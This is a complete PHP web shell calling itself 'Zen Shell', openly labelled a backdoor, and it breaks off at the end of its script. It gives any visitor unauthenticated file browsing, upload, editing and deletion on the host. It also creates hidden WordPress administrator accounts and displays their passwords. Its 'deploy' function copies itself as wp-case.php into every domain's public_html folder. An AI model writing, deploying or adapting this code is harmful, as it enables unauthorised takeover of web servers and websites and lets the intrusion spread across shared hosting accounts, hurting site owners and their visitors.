<?php
/**
 * ═══════════════════════════════════════════════════════════════════════════
 *   ██╗  ██╗███████╗███╗   ██╗    ███████╗██╗  ██╗███████╗██╗     ██╗     
 *   ██║  ██║██╔════╝████╗  ██║    ██╔════╝██║  ██║██╔════╝██║     ██║     
 *   ███████║█████╗  ██╔██╗ ██║    ███████╗███████║█████╗  ██║     ██║     
 *   ██╔══██║██╔══╝  ██║╚██╗██║    ╚════██║██╔══██║██╔══╝  ██║     ██║     
 *   ██║  ██║███████╗██║ ╚████║    ███████║██║  ██║███████╗███████╗███████╗
 *   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝    ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
 * 
 *                      ZEN SHELL · MINIMAL EDITION
 *                    "Simplicity is the ultimate sophistication"
 *                          Version: 12.0 "Stillness"
 *                         Backdoor: wp-case.php
 * ═══════════════════════════════════════════════════════════════════════════
 * 
 * This is a complete rewrite with a minimalist philosophy:
 * - Clean, readable code
 * - Functional approach
 * - No unnecessary complexity
 * - Fast and lightweight
 */

// ──────────────────────────────────────────────────────────────────────────────
// 1. SYSTEM SETUP
// ──────────────────────────────────────────────────────────────────────────────

error_reporting(0);
ini_set('display_errors', '0');
header('X-Powered-By: ZenShell/12.0');

// ──────────────────────────────────────────────────────────────────────────────
// 2. CONSTANTS
// ──────────────────────────────────────────────────────────────────────────────

define('ZEN_NAME', 'Zen Shell');
define('ZEN_VER', '12.0');
define('ZEN_BACKDOOR', 'wp-case.php');
define('ZEN_MAX_SIZE', 25 * 1024 * 1024);

// ──────────────────────────────────────────────────────────────────────────────
// 3. CORE HELPERS
// ──────────────────────────────────────────────────────────────────────────────

function zen_format_size($bytes) {
    if ($bytes >= 1073741824) return round($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return round($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return round($bytes / 1024, 2) . ' KB';
    return $bytes . ' B';
}

function zen_random_string($len = 12) {
    $pool = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    return substr(str_shuffle(str_repeat($pool, 5)), 0, $len);
}

function zen_strong_password($len = 16) {
    $pool = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*';
    return substr(str_shuffle(str_repeat($pool, 5)), 0, $len);
}

function zen_permissions($path) {
    return substr(sprintf('%o', fileperms($path)), -3);
}

function zen_sanitize($input) {
    return preg_replace('/[^a-zA-Z0-9_\-\.]/', '', trim($input));
}

function zen_is_file($path) {
    return is_file($path) && is_readable($path);
}

function zen_is_dir($path) {
    return is_dir($path) && is_readable($path);
}

// ──────────────────────────────────────────────────────────────────────────────
// 4. PATH HANDLING
// ──────────────────────────────────────────────────────────────────────────────

function zen_resolve_path($input = null) {
    $default = getcwd();
    if (empty($input)) return $default;
    $resolved = realpath($input);
    return $resolved !== false ? $resolved : $default;
}

function zen_parent_path($path) {
    $parent = dirname($path);
    return ($parent !== $path) ? $parent : false;
}

function zen_breadcrumbs($path) {
    $crumbs = [];
    $parts = explode('/', trim($path, '/'));
    $accum = '';
    $crumbs[] = ['label' => '~', 'path' => '/'];
    foreach ($parts as $part) {
        if (!empty($part)) {
            $accum .= '/' . $part;
            $crumbs[] = ['label' => $part, 'path' => $accum];
        }
    }
    return $crumbs;
}

function zen_is_domains_context($path) {
    return (strpos($path, 'domains') !== false || basename($path) === 'domains');
}

// ──────────────────────────────────────────────────────────────────────────────
// 5. DOMAIN DETECTION
// ──────────────────────────────────────────────────────────────────────────────

function zen_detect_domain($path) {
    $doc = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '';
    $host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost';
    $proto = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https://' : 'http://';
    
    if (!empty($doc) && strpos($path, $doc) === 0) {
        $rel = substr($path, strlen($doc));
        return $proto . $host . $rel;
    }
    
    $cursor = $path;
    while ($cursor && $cursor !== '/') {
        if (file_exists($cursor . '/wp-config.php')) {
            $conf = file_get_contents($cursor . '/wp-config.php');
            if (preg_match("/define\(\s*['\"]WP_HOME['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $conf, $m)) {
                return $m[1];
            }
            if (preg_match("/define\(\s*['\"]WP_SITEURL['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $conf, $m)) {
                return $m[1];
            }
        }
        $cursor = dirname($cursor);
    }
    return null;
}

// ──────────────────────────────────────────────────────────────────────────────
// 6. FILE SYSTEM OPERATIONS
// ──────────────────────────────────────────────────────────────────────────────

function zen_scan_directory($path) {
    $result =['dirs' => [], 'files' => []];
    
    if (!zen_is_dir($path)) return $result;
    
    $items = scandir($path);
    if ($items === false) return $result;
    
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        
        $full = $path . '/' . $item;
        $info = [
            'name' => $item,
            'path' => $full,
            'mtime' => filemtime($full),
            'perms' => zen_permissions($full)
        ];
        
        if (is_dir($full)) {
            $result['dirs'][] = $info;
        } else {
            $info['size'] = filesize($full);
            $info['ext'] = strtolower(pathinfo($item, PATHINFO_EXTENSION));
            $result['files'][] = $info;
        }
    }
    
    usort($result['dirs'], function($a, $b) {
        return strcasecmp($a['name'], $b['name']);
    });
    usort($result['files'], function($a, $b) {
        return strcasecmp($a['name'], $b['name']);
    });
    
    return $result;
}

function zen_delete_item($path, $name) {
    $target = $path . '/' . basename($name);
    if (!file_exists($target)) return false;
    return is_dir($target) ? rmdir($target) : unlink($target);
}

function zen_create_directory($path, $name) {
    $clean = zen_sanitize($name);
    if (empty($clean)) return false;
    $target = $path . '/' . $clean;
    if (file_exists($target)) return false;
    return mkdir($target, 0755);
}

function zen_upload_file($path, $file) {
    if ($file['error'] !== UPLOAD_ERR_OK) return false;
    if ($file['size'] > ZEN_MAX_SIZE) return false;
    $dest = $path . '/' . basename($file['name']);
    return move_uploaded_file($file['tmp_name'], $dest);
}

function zen_read_file($path, $name) {
    $target = $path . '/' . basename($name);
    if (!zen_is_file($target)) return false;
    return file_get_contents($target);
}

function zen_write_file($path, $name, $content) {
    $target = $path . '/' . basename($name);
    return file_put_contents($target, $content) !== false;
}

function zen_get_icon($ext) {
    $map = [
        'php' => '🐘', 'html' => '🌐', 'css' => '🎨', 'js' => '📜',
        'jpg' => '🖼️', 'png' => '🖼️', 'gif' => '🖼️', 'svg' => '🖼️',
        'zip' => '📦', 'tar' => '📦', 'gz' => '📦',
        'sql' => '🗄️', 'json' => '📋', 'xml' => '📋',
        'sh' => '⚙️', 'py' => '🐍', 'rb' => '💎',
        'txt' => '📄', 'log' => '📄', 'md' => '📄'
    ];
    return isset($map[$ext]) ? $map[$ext] : '📄';
}

// ──────────────────────────────────────────────────────────────────────────────
// 7. WORDPRESS BACKDOOR
// ──────────────────────────────────────────────────────────────────────────────

function zen_find_wp_root($path) {
    $cursor = $path;
    while ($cursor && $cursor !== '/') {
        if (file_exists($cursor . '/wp-load.php')) {
            return $cursor;
        }
        $cursor = dirname($cursor);
    }
    return false;
}

function zen_create_wp_admin($path) {
    $wp_root = zen_find_wp_root($path);
    if (!$wp_root) {
        return ['ok' => false, 'msg' => 'WordPress not found'];
    }
    
    require_once($wp_root . '/wp-load.php');
    
    if (!function_exists('wp_create_user')) {
        return ['ok' => false, 'msg' => 'WordPress core not loaded'];
    }
    
    $username = 'zen_' . zen_random_string(6);
    $password = zen_strong_password(16);
    $email = $username . '@' . (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'zen.local');
    
    if (username_exists($username) || email_exists($email)) {
        return ['ok' => false, 'msg' => 'User collision'];
    }
    
    $uid = wp_create_user($username, $password, $email);
    
    if (is_wp_error($uid)) {
        return ['ok' => false, 'msg' => $uid->get_error_message()];
    }
    
    $user = new WP_User($uid);
    $user->set_role('administrator');
    
    return [
        'ok' => true,
        'username' => $username,
        'password' => $password,
        'email' => $email,
        'login' => get_site_url() . '/wp-admin'
    ];
}

// ──────────────────────────────────────────────────────────────────────────────
// 8. MASS DEPLOYMENT
// ──────────────────────────────────────────────────────────────────────────────

function zen_find_domains($path) {
    if (basename($path) === 'domains') return $path;
    $cursor = $path;
    while ($cursor && $cursor !== '/') {
        if (basename($cursor) === 'domains') return $cursor;
        $cursor = dirname($cursor);
    }
    return false;
}

function zen_deploy_clones($path) {
    $domains = zen_find_domains($path);
    if (!$domains || !zen_is_dir($domains)) {
        return ['ok' => false, 'clones' => [], 'msg' => 'Domains folder not found'];
    }
    
    $clones = [];
    $items = scandir($domains);
    
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        
        $domain_dir = $domains . '/' . $item;
        if (!zen_is_dir($domain_dir)) continue;
        
        $public = $domain_dir . '/public_html';
        if (!zen_is_dir($public)) continue;
        
        $target = $public . '/' . ZEN_BACKDOOR;
        if (copy(__FILE__, $target)) {
            $proto = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https://' : 'http://';
            $clones[] = [
                'domain' => $item,
                'url' => $proto . $item . '/' . ZEN_BACKDOOR
            ];
        }
    }
    
    if (empty($clones)) {
        return ['ok' => false, 'clones' => [], 'msg' => 'No public_html directories found'];
    }
    
    return ['ok' => true, 'clones' => $clones, 'msg' => 'Deployed to ' . count($clones) . ' domains'];
}

// ──────────────────────────────────────────────────────────────────────────────
// 9. REQUEST HANDLING
// ──────────────────────────────────────────────────────────────────────────────

$zen_flash = '';
$zen_flash_type = '';

function zen_set_flash($msg, $type = 'info') {
    global $zen_flash, $zen_flash_type;
    $zen_flash = $msg;
    $zen_flash_type = $type;
}

// Resolve current path
$cwd = zen_resolve_path(isset($_GET['p']) ? $_GET['p'] : null);
$parent = zen_parent_path($cwd);
$crumbs = zen_breadcrumbs($cwd);
$scan = zen_scan_directory($cwd);
$domain = zen_detect_domain($cwd);
$is_domains = zen_is_domains_context($cwd);

// State
$deployed = [];
$wp_result = null;
$edit_content = null;
$edit_file = null;

// --- Deploy ---
if (isset($_GET['deploy'])) {
    $result = zen_deploy_clones($cwd);
    $deployed = $result['clones'];
    zen_set_flash($result['msg'], $result['ok'] ? 'success' : 'error');
}

// --- WordPress ---
if (isset($_GET['wp'])) {
    $wp_result = zen_create_wp_admin($cwd);
    zen_set_flash($wp_result['msg'], $wp_result['ok'] ? 'success' : 'error');
}

// --- Upload ---
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['up'])) {
    if (zen_upload_file($cwd, $_FILES['up'])) {
        zen_set_flash('Uploaded: ' . basename($_FILES['up']['name']), 'success');
        header("Location: ?p=" . urlencode($cwd));
        exit;
    } else {
        zen_set_flash('Upload failed', 'error');
    }
}

// --- Mkdir ---
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['mkdir'])) {
    if (zen_create_directory($cwd, $_POST['name'])) {
        zen_set_flash('Created: ' . $_POST['name'], 'success');
        header("Location: ?p=" . urlencode($cwd));
        exit;
    } else {
        zen_set_flash('Failed to create directory', 'error');
    }
}

// --- Delete ---
if (isset($_GET['rm'])) {
    if (zen_delete_item($cwd, $_GET['rm'])) {
        header("Location: ?p=" . urlencode($cwd));
        exit;
    }
}

// --- Edit load ---
if (isset($_GET['edit'])) {
    $edit_file = $_GET['edit'];
    $edit_content = zen_read_file($cwd, $edit_file);
}

// --- Edit save ---
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save']) && $edit_file) {
    if (zen_write_file($cwd, $edit_file, $_POST['content'])) {
        $edit_content = $_POST['content'];
        zen_set_flash('Saved: ' . $edit_file, 'success');
    } else {
        zen_set_flash('Save failed', 'error');
    }
}

// ──────────────────────────────────────────────────────────────────────────────
// 10. RENDER
// ──────────────────────────────────────────────────────────────────────────────

$dir_count = count($scan['dirs']);
$file_count = count($scan['files']);
$total = $dir_count + $file_count;

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>☯ ZEN SHELL · <?php echo ZEN_VER; ?></title>
    <style>
        /* ===================================================================
           ZEN THEME · Minimal · Clean · Peaceful
           Inspired by Japanese minimalism and terminal aesthetics
        =================================================================== */
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #0d0d12;
            background-image: radial-gradient(circle at 50% 0%, rgba(100, 200, 255, 0.03) 0%, transparent 50%);
            font-family: 'SF Mono', 'Fira Code', 'Courier New', monospace;
            padding: 16px;
            min-height: 100vh;
            color: #b8c8dd;
        }
        
        .container {
            max-width: 1600px;
            margin: 0 auto;
        }
        
        /* HEADER - Zen minimal */
        .zen-header {
            background: rgba(13, 13, 18, 0.9);
            border-bottom: 1px solid rgba(100, 200, 255, 0.15);
            padding: 14px 20px;
            margin-bottom: 16px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
        }
        
        .zen-title {
            font-size: 1.3rem;
            font-weight: 300;
            letter-spacing: 2px;
        }
        
        .zen-title .accent {
            color: #64c8ff;
        }
        
        .zen-title .muted {
            color: #4a5a6a;
            font-size: 0.7rem;
        }
        
        .zen-badge {
            background: rgba(100, 200, 255, 0.1);
            border: 1px solid rgba(100, 200, 255, 0.2);
            padding: 2px 10px;
            font-size: 0.6rem;
            color: #64c8ff;
            letter-spacing: 1px;
        }
        
        /* BUTTONS - Minimal */
        .btn {
            background: rgba(13, 13, 18, 0.8);
            border: 1px solid #2a3a4a;
            padding: 5px 14px;
            font-family: monospace;
            font-size: 0.65rem;
            color: #8898a8;
            cursor: pointer;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 6px;
            transition: all 0.2s ease;
            letter-spacing: 0.3px;
        }
        
        .btn:hover {
            border-color: #64c8ff;
            color: #64c8ff;
        }
        
        .btn-primary {
            background: rgba(100, 200, 255, 0.1);
            border-color: #64c8ff;
            color: #64c8ff;
        }
        
        .btn-primary:hover {
            background: #64c8ff;
            color: #0d0d12;
        }
        
        .btn-danger {
            border-color: #ff4466;
            color: #ff6688;
        }
        
        .btn-danger:hover {
            border-color: #ff4466;
            color: #ff4466;
        }
        
        /* BREADCRUMB */
        .zen-bread {
            background: rgba(13, 13, 18, 0.6);
            border: 1px solid rgba(42, 58, 74, 0.5);
            padding: 6px 12px;
            margin-bottom: 12px;
            display: flex;
            flex-wrap: wrap;
            gap: 3px;
        }
        
        .crumb {
            padding: 3px 8px;
            text-decoration: none;
            color: #6a7a8a;
            font-size: 0.65rem;
            transition: 0.2s;
        }
        
        .crumb:hover {
            color: #64c8ff;
        }
        
        /* QUICK NAV */
        .zen-nav {
            background: rgba(13, 13, 18, 0.6);
            border: 1px solid rgba(42, 58, 74, 0.5);
            padding: 6px 12px;
            margin-bottom: 12px;
            display: flex;
            flex-wrap: wrap;
            gap: 4px;
        }
        
        .zen-nav a {
            padding: 3px 10px;
            text-decoration: none;
            color: #6a7a8a;
            font-size: 0.6rem;
            border: 1px solid transparent;
            transition: 0.2s;
        }
        
        .zen-nav a:hover {
            border-color: #64c8ff;
            color: #64c8ff;
        }
        
        /* TOOLBAR */
        .zen-toolbar {
            background: rgba(13, 13, 18, 0.6);
            border: 1px solid rgba(42, 58, 74, 0.5);
            padding: 10px 12px;
            margin-bottom: 16px;
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
        }
        
        .tool-group {
            display: flex;
            gap: 4px;
            align-items: center;
            background: rgba(0, 0, 0, 0.3);
            padding: 3px 8px;
            border: 1px solid rgba(42, 58, 74, 0.3);
        }
        
        .tool-group input {
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid #2a3a4a;
            padding: 4px 8px;
            color: #b8c8dd;
            font-family: monospace;
            font-size: 0.65rem;
        }
        
        .tool-group input:focus {
            outline: none;
            border-color: #64c8ff;
        }
        
        /* FLASH */
        .flash {
            padding: 8px 14px;
            margin-bottom: 12px;
            border-left: 3px solid;
            background: rgba(13, 13, 18, 0.6);
            font-size: 0.75rem;
        }
        
        .flash-success { border-color: #64ff88; color: #88ffbb; }
        .flash-error { border-color: #ff4466; color: #ff8888; }
        .flash-warning { border-color: #ffaa44; color: #ffdd88; }
        .flash-info { border-color: #64c8ff; color: #88ddff; }
        
        /* LAYOUT */
        .zen-grid {
            display: grid;
            grid-template-columns: 1fr 260px;
            gap: 16px;
        }
        
        /* SECTION */
        .section {
            font-size: 0.6rem;
            font-weight: 400;
            text-transform: uppercase;
            letter-spacing: 2px;
            color: #64c8ff;
            margin: 18px 0 8px 0;
            padding-left: 6px;
            border-left:2px solid #64c8ff;
        }
        
        /* CARDS */
        .card-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
            gap: 8px;
        }
        
        .card {
            background: rgba(13, 13, 18, 0.6);
            border: 1px solid rgba(42, 58, 74, 0.5);
            padding: 10px 12px;
            transition: all 0.2s;
        }
        
        .card:hover {
            border-color: rgba(100, 200, 255, 0.3);
        }
        
        .card-icon { font-size: 1.4rem; }
        .card-name { font-size: 0.75rem; font-weight: 500; word-break: break-word; margin: 4px 0; }
        .card-meta { font-size: 0.5rem; color: #5a6a7a; padding: 4px 0; border-top: 1px solid rgba(42, 58, 74, 0.3); }
        .card-actions { display: flex; gap: 4px; margin-top: 4px; flex-wrap: wrap; }
        
        .card-btn {
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid #2a3a4a;
            padding: 2px 8px;
            font-size: 0.5rem;
            text-decoration: none;
            color: #6a7a8a;
            transition: 0.2s;
        }
        
        .card-btn:hover {
            border-color: #64c8ff;
            color: #64c8ff;
        }
        
        .card-btn-danger:hover {
            border-color: #ff4466;
            color: #ff4466;
        }
        
        /* SIDEBAR */
        .widget {
            background: rgba(13, 13, 18, 0.6);
            border: 1px solid rgba(42, 58, 74, 0.5);
            padding: 10px 12px;
            margin-bottom: 12px;
        }
        
        .widget-title {
            font-size: 0.6rem;
            font-weight: 400;
            letter-spacing: 1px;
            color: #64c8ff;
            border-bottom: 1px solid rgba(42, 58, 74, 0.3);
            padding-bottom: 4px;
            margin-bottom: 6px;
        }
        
        .info-row {
            font-size: 0.55rem;
            padding: 4px 0;
            border-bottom: 1px solid rgba(42, 58, 74, 0.2);
        }
        
        .info-row strong {
            color: #88aabb;
            display: block;
        }
        
        /* EDITOR */
        .zen-editor {
            border: 1px solid rgba(42, 58, 74, 0.5);
        }
        
        .zen-editor .head {
            background: rgba(13, 13, 18, 0.8);
            padding: 8px 12px;
            border-bottom: 1px solid rgba(42, 58, 74, 0.5);
            display: flex;
            justify-content: space-between;
        }
        
        .zen-editor textarea {
            width: 100%;
            min-height: 450px;
            background: #08080c;
            border: none;
            color: #b8c8dd;
            font-family: monospace;
            font-size: 0.65rem;
            padding: 12px;
            resize: vertical;
            line-height: 1.5;
        }
        
        .zen-editor textarea:focus {
            outline: none;
            background: #0a0a0f;
        }
        
        .zen-editor .foot {
            padding: 8px 12px;
            background: rgba(13, 13, 18, 0.8);
            border-top: 1px solid rgba(42, 58, 74, 0.5);
            text-align: right;
        }
        
        /* CLONES */
        .clone-item {
            padding: 4px 0;
            border-bottom: 1px solid rgba(42, 58, 74, 0.2);
            display: flex;
            gap: 6px;
            font-size: 0.55rem;
            align-items: center;
        }
        
        .clone-url {
            color: #64c8ff;
            text-decoration: none;
            word-break: break-all;
        }
        
        .clone-url:hover {
            text-decoration: underline;
        }
        
        /* EMPTY */
        .empty {
            text-align: center;
            padding: 30px 20px;
            background: rgba(13, 13, 18, 0.4);
            border: 1px dashed rgba(42, 58, 74, 0.3);
            color: #4a5a6a;
        }
        
        /* FOOTER */
        .zen-footer {
            margin-top: 20px;
            background: rgba(13, 13, 18, 0.4);
            border-top: 1px solid rgba(42, 58, 74, 0.3);
            padding: 6px 12px;
            font-size: 0.5rem;
            color: #4a5a6a;
            text-align: center;
            display: flex;
            justify-content: space-between;
            flex-wrap: wrap;
        }
        
        .zen-footer .zen {
            color: #64c8ff;
        }
        
        @media (max-width: 760px) {
            .zen-grid { grid-template-columns: 1fr; }
            body { padding: 10px; }
        }
    </style>
</head>
<body>
<div class="container">
    
    <!-- HEADER -->
    <div class="zen-header">
        <div>
            <span class="zen-title">
                <span class="accent">☯</span> 
                <span class="accent">ZEN</span><span class="muted">SHELL</span>
            </span>
            <span class="zen-badge">v<?php echo ZEN_VER; ?></span>
        </div>
        <div style="display:flex; gap:6px; flex-wrap:wrap;">
            <a href="?p=<?php echo urlencode($cwd); ?>&deploy=1" class="btn btn-primary">📦 DEPLOY</a>
            <a href="?p=<?php echo urlencode($cwd); ?>&wp=1" class="btn btn-danger">🎭 WP</a>
        </div>
    </div>
    
    <!-- BREADCRUMB -->
    <div class="zen-bread">
        <?php foreach ($crumbs as $i => $cr): ?>
            <a href="?p=<?php echo urlencode($cr['path']); ?>" class="crumb"><?php echo htmlspecialchars($cr['label']); ?></a>
            <?php if ($i < count($crumbs)-1): ?><span style="color:#2a3a4a;">/</span><?php endif; ?>
        <?php endforeach; ?>
    </div>
    
    <!-- QUICK NAV -->
    <div class="zen-nav">
        <?php if ($parent): ?>
            <a href="?p=<?php echo urlencode($parent); ?>">⬆ PARENT</a>
        <?php endif; ?>
        <a href="?p=/">🌐 ROOT</a>
        <a href="?p=/home">🏠 HOME</a>
        <a href="?p=/var/www">🌍 WWW</a>
        <a href="?p=/tmp">📁 TMP</a>
        <a href="?p=<?php echo urlencode($cwd); ?>&deploy=1" style="border-color:#64c8ff;">⚡ DEPLOY ALL</a>
    </div>
    
    <!-- TOOLBAR -->
    <div class="zen-toolbar">
        <div class="tool-group">
            <form method="post" enctype="multipart/form-data" style="display:flex; gap:4px;">
                <input type="file" name="up">
                <button type="submit" class="btn">⬆ UPLOAD</button>
            </form>
        </div>
        <div class="tool-group">
            <form method="post" style="display:flex; gap:4px;">
                <input type="text" name="name" placeholder="folder">
                <button type="submit" name="mkdir" value="1" class="btn">📁 MKDIR</button>
            </form>
        </div>
        <div class="tool-group">
            <a href="?p=<?php echo urlencode($cwd); ?>&wp=1" class="btn btn-danger">⚡ WP</a>
            <a href="?p=<?php echo urlencode($cwd); ?>" class="btn">🔄 REFRESH</a>
        </div>
    </div>
    
    <!-- FLASH -->
    <?php if ($zen_flash): ?>
    <div class="flash flash-<?php echo $zen_flash_type; ?>">
        <?php echo htmlspecialchars($zen_flash); ?>
    </div>
    <?php endif; ?>
    
    <!-- WP RESULT -->
    <?php if ($wp_result && $wp_result['ok']): ?>
    <div class="flash flash-success">
        <strong>🎯 WORDPRESS BACKDOOR</strong><br>
        USER: <span style="color:#64c8ff;"><?php echo $wp_result['username']; ?></span><br>
        PASS: <span style="color:#ff88aa;"><?php echo $wp_result['password']; ?></span><br>
        URL: <a href="<?php echo $wp_result['login']; ?>" target="_blank" style="color:#64c8ff;"><?php echo $wp_result['login']; ?></a>
    </div>
    <?php endif; ?>
    
    <!-- DEPLOYED -->
    <?php if (!empty($deployed)): ?>
    <div class="widget" style="border-color:#64c8ff; margin-bottom:12px;">
        <div class="widget-title">📦 DEPLOYED · <?php echo ZEN_BACKDOOR; ?></div>
        <?php foreach ($deployed as $c): ?>
        <div class="clone-item">
            <span style="color:#64c8ff;">✦</span>
            <a href="<?php echo htmlspecialchars($c['url']); ?>" target="_blank" class="clone-url"><?php echo htmlspecialchars($c['url']); ?></a>
            <span style="color:#4a5a6a; font-size:0.5rem;">[<?php echo htmlspecialchars($c['domain']); ?>]</span>
        </div>
        <?php endforeach; ?>
    </div>
    <?php endif; ?>
    
    <!-- GRID -->
    <div class="zen-grid">
        <!-- MAIN -->
        <div>
            <?php if ($edit_content !== null): ?>
            <!-- EDITOR -->
            <div class="zen-editor">
                <div class="head">
                    <span>✏️ <span style="color:#64c8ff;"><?php echo htmlspecialchars($edit_file); ?></span></span>
                    <a href="?p=<?php echo urlencode($cwd); ?>" class="btn">← BACK</a>
                </div>
                <form method="post">
                    <textarea name="content"><?php echo htmlspecialchars($edit_content); ?></textarea>
                    <div class="foot">
                        <button type="submit" name="save" value="1" class="btn btn-primary">💾 SAVE</button>
                    </div>
                </form>
            </div>
            <?php else: ?>
            
            <!-- DIRECTORIES -->
            <?php if (!empty($scan['dirs'])): ?>
            <div class="section">📁 DIRECTORIES · <?php echo $dir_count; ?></div>
            <div class="card-grid">
                <?php foreach ($scan['dirs'] as $dir): ?>
                <div class="card">
                    <div class="card-icon">📂</div>
                    <div class="card-name"><?php echo htmlspecialchars($dir['name']); ?></div>
                    <div class="card-meta">🕐 <?php echo date('Y-m-d', $dir['mtime']); ?> · 🔒 <?php echo $dir['perms']; ?></div>
                    <div class="card-actions">
                        <a href="?p=<?php echo urlencode($dir['path']); ?>" class="card-btn">OPEN</a>
                        <a href="?p=<?php echo urlencode($cwd); ?>&rm=<?php echo urlencode($dir['name']); ?>" class="card-btn card-btn-danger" onclick="return confirm('Delete?')">RM</a>
                    </div>
                </div>
                <?php endforeach; ?>
            </div>
            <?php endif; ?>
            
            <!-- FILES -->
            <?php if (!empty($scan['files'])): ?>
            <div class="section">📄 FILES · <?php echo $file_count; ?></div>
            <div class="card-grid">
                <?php foreach ($scan['files'] as $file): ?>
                <div class="card">
                    <div class="card-icon"><?php echo zen_get_icon($file['ext']); ?></div>
                    <div class="card-name"><?php echo htmlspecialchars($file['name']); ?></div>
                    <div class="card-meta">💾 <?php echo zen_format_size($file['size']); ?> · 🕐 <?php echo date('Y-m-d', $file['mtime']); ?></div>
                    <div class="card-actions">
                        <a href="?p=<?php echo urlencode($cwd); ?>&edit=<?php echo urlencode($file['name']); ?>" class="card-btn">EDIT</a>
                        <a href="?p=<?php echo urlencode($cwd); ?>&rm=<?php echo urlencode($file['name']); ?>" class="card-btn card-btn-danger" onclick="return confirm('Delete?')">RM</a>
                    </div>
                </div>
                <?php endforeach; ?>
            </div>
            <?php endif; ?>
            
            <!-- EMPTY -->
            <?php if (empty($scan['dirs']) && empty($scan['files'])): ?>
            <div class="empty">
                <div style="font-size:2.5rem;">☯</div>
                <p>EMPTY DIRECTORY</p>
            </div>
            <?php endif; ?>
            
            <?php endif; ?>
        </div>
        
        <!-- SIDEBAR -->
        <div>
            <!-- System -->
            <div class="widget">
                <div class="widget-title">💻 SYSTEM</div>
                <div class="info-row"><strong>PATH</strong><?php echo htmlspecialchars($cwd); ?></div>
                <?php if ($domain): ?>
                <div class="info-row"><strong>DOMAIN</strong><a href="<?php echo htmlspecialchars($domain); ?>" target="_blank" style="color:#64c8ff;"> <?php echo htmlspecialchars($domain); ?></a></div>
                <?php endif; ?>
                <div class="info-row"><strong>ITEMS</strong><?php echo $dir_count; ?> dirs · <?php echo $file_count; ?> files</div>
                <div class="info-row"><strong>FREE</strong><?php echo zen_format_size(disk_free_space($cwd)); ?></div>
                <div class="info-row"><strong>PHP</strong><?php echo PHP_VERSION; ?></div>
                <div class="info-row"><strong>SERVER</strong><?php echo isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'N/A'; ?></div>
            </div>
            
            <!-- Actions -->
            <div class="widget">
                <div class="widget-title">⚡ ACTIONS</div>
                <div style="display:flex; flex-direction:column; gap:4px;">
                    <a href="?p=<?php echo urlencode(dirname(__FILE__)); ?>" class="btn" style="justify-content:center;">📍 SCRIPT</a>
                    <a href="?p=/var/www/html" class="btn" style="justify-content:center;">🌐 WEBROOT</a>
                    <a href="?p=<?php echo urlencode($cwd); ?>&wp=1" class="btn btn-danger" style="justify-content:center;">🎭 WP BACKDOOR</a>
                    <a href="?p=<?php echo urlencode($cwd); ?>&deploy=1" class="btn btn-primary" style="justify-content:center;">📦 DEPLOY</a>
                </div>
            </div>
            
            <!-- Domains -->
            <?php if ($is_domains): ?>
            <div class="widget">
                <div class="widget-title">🌐 DOMAIN HUNTER</div>
                <p style="font-size:0.55rem; color:#4a5a6a; margin-bottom:6px;">
                    Deploy to all domains in this folder.
                </p>
                <a href="?p=<?php echo urlencode($cwd); ?>&deploy=1" class="btn btn-primary" style="width:100%; justify-content:center;">DEPLOY ALL</a>
            </div>
            <?php endif; ?>
            
            <!-- Backdoor -->
            <div class="widget">
                <div class="widget-title">🔧 BACKDOOR</div>
                <div class="info-row"><strong>FILE</strong><span style="color:#64c8ff;"><?php echo ZEN_BACKDOOR; ?></span></div>
                <div class="info-row"><strong>DEPLOY</strong><span style="color:#ff88aa;">?deploy=1</span></div>
                <div class="info-row"><strong>WP</strong><span style="color:#ff88aa;">?wp=1</span></div>
                <div class="info-row"><strong>KEYS</strong>Ctrl+S · Esc</div>
            </div>
        </div>
    </div>
    
    <!-- FOOTER -->
    <div class="zen-footer">
        <span>☯ <?php echo ZEN_NAME; ?> · v<?php echo ZEN_VER; ?></span>
        <span><?php echo $total; ?> items</span>
        <span class="zen">"Stillness in motion"</span>
    </div>
</div>

<script>
    (function() {
        // Auto dismiss flashes
        var flashes = document.querySelectorAll('.flash');
        flashes.forEach(function(f) {
            setTimeout(function() {
                f.style.transition = 'opacity 0.4s';
                f.style.opacity = '0';
                setTimeout(function() { if (f.parentNode) f.remove(); }, 400);
            }, 4500);
        });
        
        // Copy clone URLs
        var urls = document.querySelectorAll('.clone-url');
        urls.forEach(function(el) {
            el.addEventListener('click', function(e) {
                e.preventDefault();
                var url = this.href;
                navigator.clipboard.writeText(url).then(function() {
                    var old = el.innerText;
                    el.innerText = '✓ COPIED';
                    setTimeout(function() { el.innerText = old; }, 1200);
                });
            });
        });
        
        // Keyboard shortcuts
        document.addEventListener('keydown', function(e) {
            if (e.ctrlKey && e.key === 's' && document.querySelector('textarea')) {
                e.preventDefault();
